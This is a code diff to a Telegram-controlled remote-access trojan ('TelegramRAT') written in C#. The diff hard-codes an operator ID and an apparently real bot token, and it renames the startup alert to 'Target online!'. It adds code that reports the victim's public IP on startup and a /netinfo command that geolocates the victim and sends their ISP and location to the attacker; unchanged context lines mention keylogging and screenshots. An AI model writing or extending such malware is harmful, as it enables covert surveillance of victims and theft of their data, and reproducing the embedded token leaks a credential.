@@ -6,6 +6,8 @@ using System.Linq;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Threading.Tasks;
+using System.Net;
+using System.Net.Http;
 using Telegram.Bot;
 using Telegram.Bot.Types.InputFiles;
 using Telegram.Bot.Types.Enums;
@@ -27,8 +29,8 @@ namespace TelegramRAT
     {
         static TelegramBotClient Bot;
 
-        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
-        readonly static string BotToken = null; // Place your Telegram bot token. 
+        readonly static long? OwnerId = 1113634091; // Place your Telegram id here or keep it null.
+        readonly static string BotToken = "1727211141:AAHYjMAS6Zo7q7_kgRLUkkOj7lVjWonhikQ"; // Place your Telegram bot token. 
 
         static List<BotCommand> commands = new List<BotCommand>();
         static bool keylog = false;
@@ -36,6 +38,8 @@ namespace TelegramRAT
         static ScriptScope pythonScope;
         static ScriptEngine pythonEngine;
         static ScriptRuntime pythonRuntime;
+
+        static int pollingDelay = 1000;
 
         static void Main(string[] args)
         {
@@ -55,10 +59,10 @@ namespace TelegramRAT
             pythonScope = pythonRuntime.CreateScope();
 
             InitializeCommands(commands);
-
+            Run().Wait();
             try
             {
-                Run().Wait();
+                
             }
             catch (Exception ex)
             {
@@ -85,15 +89,23 @@ namespace TelegramRAT
 #endif
         }
 
+        static async Task<string> GetIpAddress()
+        {
+            HttpClient client = new HttpClient();
+            string ip = await client.GetStringAsync("https://api.ipify.org/?format=json");
+            ip = string.Join(string.Empty, ip.Skip(7).SkipLast(2));
+            return ip;
+        }
+
         static async Task Run()
         {
             Message hellomsg = await Bot.SendTextMessageAsync(OwnerId,
-                $"Computer online! \n\n" +
+                $"Target online! \n\n" +
 
                 $"Username: <b>{Environment.UserName}</b>\n" +
-                $"PC name: <b>{Environment.MachineName}</b>\n\n" +
-
-                $"OS: {GetWindowsVersion()}",
+                $"PC name: <b>{Environment.MachineName}</b>\n" +
+                $"OS: {GetWindowsVersion()}\n\n" +
+                $"IP: {await GetIpAddress()}",
                 ParseMode.Html);
 
             int offset = 0;
@@ -111,7 +123,7 @@ namespace TelegramRAT
 
                 UpdateWorker(updates).Wait();
 
-                Task.Delay(1000).Wait();
+                Task.Delay(pollingDelay).Wait();
             }
         }
 
@@ -184,6 +196,8 @@ namespace TelegramRAT
             }
             return string.Empty;
         }
+
+        
 
         static void InitializeCommands(List<BotCommand> CommandsList)
         {
@@ -705,7 +719,7 @@ namespace TelegramRAT
 
                             screenshotStream.Position = 0;
 
-                            await Bot.SendPhotoAsync(chatId: model.Message.Chat.Id, photo: screenshotStream, caption: "Screenshot!", replyToMessageId: model.Message.MessageId);
+                            await Bot.SendPhotoAsync(chatId: model.Message.Chat.Id, photo: screenshotStream, replyToMessageId: model.Message.MessageId);
 
                         }
                     }
@@ -1974,7 +1988,8 @@ namespace TelegramRAT
 
                         $"OS: {GetWindowsVersion()}({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})\n" +
                         $"NT version: {Environment.OSVersion.Version}\n" +
-                        $"Process: {(Environment.Is64BitProcess ? "64-bit" : "32-bit")}\n";
+                        $"Process: {(Environment.Is64BitProcess ? "64-bit" : "32-bit")}\n\n" +
+                        $"To get ip address and other network info type /netinfo";
 
 
                         await Bot.SendTextMessageAsync(model.Message.Chat.Id, sysInfo, replyToMessageId: model.Message.MessageId);
@@ -2021,7 +2036,45 @@ namespace TelegramRAT
                 }
             });
 
+            //NETWORK INFO
+            CommandsList.Add(new BotCommand
+            {
+                Command = "netinfo",
+                Description = "Show info about internet connection",
+                Example = "/netinfo",
+                Execute = async model =>
+                {
+                    string ipaddr = await GetIpAddress();
+                    HttpClient httpClient = new HttpClient();
+                    string ipinfo = await httpClient.GetStringAsync("http://ip-api.com/xml/" + ipaddr);
+                    System.Xml.XmlDocument doc = new System.Xml.XmlDocument();
+                    doc.LoadXml(ipinfo);
+                    
+                    TextReader reader = new StringReader(doc.ChildNodes[1].OuterXml);
+                    var serializer = new System.Xml.Serialization.XmlSerializer(typeof(NetworkInfo));
+                    NetworkInfo ni = serializer.Deserialize(reader) as NetworkInfo;
 
+                    string netinfo = "Network information:\n\n" +
+                    $"IP: {ipaddr}\n" +
+                    $"ISP: {ni.Isp}\n" +
+                    $"Country: {ni.Country}\n" +
+                    $"City: {ni.City}\n" +
+                    $"Timezone: {ni.Timezone}\n" +
+                    $"Country Code: {ni.CountryCode}";
+
+                    await Bot.SendTextMessageAsync(model.Message.Chat.Id, netinfo);
+                }
+            });
+
+            //CHANGE CONFIGURATION
+            CommandsList.Add(new BotCommand
+            {
+                Command = "config",
+                Execute = async model =>
+                {
+
+                }
+            });
         }
 
     }
